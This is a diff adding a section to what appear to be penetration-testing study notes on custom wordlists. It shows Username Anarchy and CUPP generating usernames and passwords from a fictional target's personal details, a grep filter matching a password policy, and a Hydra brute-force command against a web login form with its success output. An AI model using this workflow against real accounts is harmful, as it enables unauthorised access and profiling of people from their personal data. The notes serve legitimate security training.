@@ -649,6 +649,102 @@ ftp ftp://ftpuser:<PASSWORD>@localhost
 ls
 ```
 
+---
+
+# Custom Wordlists
+
+## **1. Importance of Custom Wordlists**  
+- **Pre-made wordlists** (e.g., rockyou, SecLists) cover common passwords but lack **specificity** for targeted attacks.  
+- Custom wordlists increase **efficiency** by tailoring usernames and passwords to the target.  
+- Sources for crafting custom wordlists:  
+  - Social media (birthdates, hobbies, pet names)  
+  - Company directories  
+  - Public records and OSINT  
+
+## **2. Generating Custom Usernames with Username Anarchy**  
+
+### **Why Use Username Anarchy?**  
+- People create **complex usernames** (e.g., initials, leetspeak, hobbies).  
+- Automates username variations for a **broader attack surface**.  
+
+### **Installation & Usage**  
+```bash
+sudo apt install ruby -y
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+```
+```bash
+./username-anarchy Jane Smith > jane_smith_usernames.txt
+```
+### **Example Output**  
+- Basic: `janesmith`, `smithjane`, `j.smith`  
+- Initials: `js`, `j.s.`, `s.j.`  
+- Leetspeak: `j4n3`, `5m1th`, `j@n3_s`  
+
+
+## **3. Generating Custom Password Lists with CUPP**  
+
+### **Why Use CUPP?**  
+- Leverages **target-specific data** for password generation.  
+- Uses OSINT to **create personalized wordlists**.  
+
+### **Installation & Usage**  
+```bash
+sudo apt install cupp -y
+cupp -i
+```
+### **Example Inputs for Jane Smith**  
+- Name: **Jane Smith**  
+- Nickname: **Janey**  
+- Birthdate: **11-12-1990**  
+- Partner’s Name: **Jim (Jimbo)**  
+- Pet’s Name: **Spot**  
+- Company: **AHI**  
+- Interests: **hacker, blue**  
+
+### **Generated Passwords Examples**  
+- Original & Capitalized: `jane`, `Jane`  
+- Birthdate Variations: `jane1990`, `smith1212`  
+- Special Characters: `jane!`, `smith@`  
+- Leetspeak: `j4n3`, `5m1th`  
+- Mutations: `Jane1990!`, `smith2708@`  
+
+## **4. Filtering Passwords to Match Security Policies**  
+
+### **Company AHI's Password Policy**  
+- Minimum **6 characters**  
+- At least **one uppercase & one lowercase letter**  
+- At least **one number**  
+- At least **two special characters (!@#$%^&*)**  
+
+### **Filtering with `grep`**  
+```bash
+grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+```
+- **Reduces** ~46,000 passwords to ~7,900 **policy-compliant** passwords.  
+
+## **5. Using Hydra for Brute-Force Attacks**  
+
+### **Executing Hydra Attack**  
+```bash
+hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+```
+### **Command Breakdown**  
+| Parameter | Description |
+|-----------|-------------|
+| `-L usernames.txt` | Username list (from Username Anarchy) |
+| `-P jane-filtered.txt` | Password list (from CUPP) |
+| `IP` | Target system's IP address |
+| `-s PORT` | Target service's port |
+| `-f` | Stops after the first successful attempt |
+| `http-post-form` | Specifies the login form for brute-force |
+
+### **Hydra Output (Success)**  
+```bash
+[PORT][http-post-form] host: IP   login: ...   password: ...
+1 valid password found
+```
+
 
 
 
